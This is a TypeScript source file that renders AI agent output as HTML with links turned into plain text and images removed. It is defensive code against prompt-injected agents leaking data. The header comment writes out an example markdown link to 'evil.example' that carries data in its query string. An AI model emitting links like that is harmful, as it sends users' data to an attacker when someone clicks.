/**
 * Agent text as HTML, with no clickable link in it.
 *
 * Agent text is untrusted and can be steered by something the agent read, so
 * `[Open the report](https://evil.example/?d=<data>)` would hide a URL that
 * carries data behind friendly words, one click from leaving the building.
 * Every link becomes plain text with its destination written out. Every image
 * is removed: no `src` survives sanitizing, so a reply cannot load one, and an
 * attachment token would only leave a broken box.
 *
 * `renderCommentHtml` stays the only sanitizer (the flags feature uses it and
 * is not changed). This takes its sanitized output, swaps each anchor for a
 * text node in an inert `<template>` (never the live document, so nothing
 * loads or runs while it is parsed), and returns the HTML. It is the only
 * thing that feeds `dangerouslySetInnerHTML` for agent text.
 *
 * ponytail: no agent link is clickable in Phase 1. If people need links, a
 * host allowlist (keep an `<a>` only when its host is on the list) is the
 * upgrade path.
 */

import { renderCommentHtml } from '@/components/flags/comment-markdown'

/** `label (href)`, or `href` alone when the label already is it. */
function linkText(label: string, href: string | null): string {
  if (href === null || href === '') return label
  return label === href || label === '' ? href : `${label} (${href})`
}

export function renderAgentHtml(text: string): string {
  const template = document.createElement('template')
  template.innerHTML = renderCommentHtml(text, [])
  for (const image of template.content.querySelectorAll('img')) image.remove()
  for (const anchor of template.content.querySelectorAll('a')) {
    // The raw attribute, not `anchor.href`: that would resolve a relative link
    // against the page origin and show an address the agent never wrote.
    anchor.replaceWith(
      document.createTextNode(
        linkText(anchor.textContent ?? '', anchor.getAttribute('href'))
      )
    )
  }
  return template.innerHTML
}
